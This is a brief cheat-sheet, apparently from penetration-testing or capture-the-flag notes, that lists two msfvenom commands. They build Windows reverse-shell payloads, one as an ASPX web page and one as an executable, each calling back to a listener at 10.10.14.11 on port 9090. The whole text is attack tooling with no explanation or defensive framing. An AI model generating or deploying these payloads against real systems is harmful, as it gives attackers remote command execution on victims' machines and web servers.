### Windows ASPX reverse shell
`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9090 -f aspx -o shell.aspx`

### Windows EXE reverse shell
`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9090 -f exe -o shell.exe`
